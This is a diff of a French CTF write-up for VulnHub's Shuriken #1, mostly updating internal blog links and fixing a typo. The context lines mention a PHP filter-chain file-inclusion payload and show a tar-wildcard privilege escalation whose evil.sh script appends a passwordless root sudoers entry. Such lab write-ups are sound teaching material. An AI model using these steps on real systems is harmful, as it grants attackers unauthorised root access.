@@ -3,7 +3,7 @@ title: "Solution du CTF Shuriken #1 de VulnHub"
 tags: [CTF, VulnHub]
 ---
 
-Après avoir solutionné [Shuriken: Node](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Shuriken%3A%20Node%20de%20VulnHub.md) je me suis penché sur le premier de la série.
+Après avoir solutionné [Shuriken: Node]({% link _posts/2022-11-14-Solution-du-CTF-Shuriken-Node-de-VulnHub.md %}) je me suis penché sur le premier de la série.
 
 ```
 Nmap scan report for 192.168.56.56
@@ -72,7 +72,7 @@ Evil request:
 ---
 ```
 
-Le payload correspond à la technique que j'ai décrit pour le CTF [Corrosion](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Corrosion%20de%20VulnHub.md) et que j'ai depuis ajouté dans *Wapiti*.
+Le payload correspond à la technique que j'ai décrit pour le CTF [Corrosion]({% link _posts/2022-10-27-Solution-du-CTF-Corrosion-de-VulnHub.md %}) et que j'ai depuis ajouté dans *Wapiti*.
 
 Si je j'inecte le payload suivant encodé avec [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) :
 
@@ -252,9 +252,9 @@ ls -lh $dest
 
 ## Shine like a star
 
-On est dans un cas d'exploitation similaire au CTF [Pipe](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20devrandom%3A%20Pipe%20de%20VulnHub.md) où l'on va pouvoir exploiter utilisation du wildcard dans la commande `tar`. Je recommande la lecture de l'article  [Dangers of wildcards in bash](https://www.soliantconsulting.com/blog/dangers-wildcards-bash/) pour plus de détails.
+On est dans un cas d'exploitation similaire au CTF [Pipe]({% link _posts/2017-11-17-Solution-du-CTF-devrandom-Pipe-de-VulnHub.md %}) où l'on va pouvoir exploiter utilisation du wildcard dans la commande `tar`. Je recommande la lecture de l'article  [Dangers of wildcards in bash](https://www.soliantconsulting.com/blog/dangers-wildcards-bash/) pour plus de détails.
 
-Pour cela je créé un script bash qui va rajouter une ligne au `/etc/sudoers` puis des fichiers vides nommés après des options de `tar` qui seront pris comme tels à cause du wildcard :
+Pour cela je crée un script bash qui va rajouter une ligne au `/etc/sudoers` puis des fichiers vides nommés après des options de `tar` qui seront pris comme tels à cause du wildcard :
 
 ```bash
 $ echo '#!/bin/bash\necho "server-management ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers' > evil.sh
